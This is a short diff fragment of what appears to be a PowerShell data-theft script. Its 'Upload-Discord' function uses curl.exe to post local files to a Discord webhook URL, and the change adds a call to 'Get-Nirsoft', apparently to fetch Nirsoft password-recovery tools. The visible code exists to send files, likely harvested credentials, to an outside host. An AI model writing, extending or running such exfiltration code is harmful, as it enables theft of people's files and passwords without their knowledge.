@@ -30,3 +30,5 @@ function Upload-Discord {
         curl.exe -F "file1=@$file" $DiscordUrl
     }
 }
+
+Get-Nirsoft
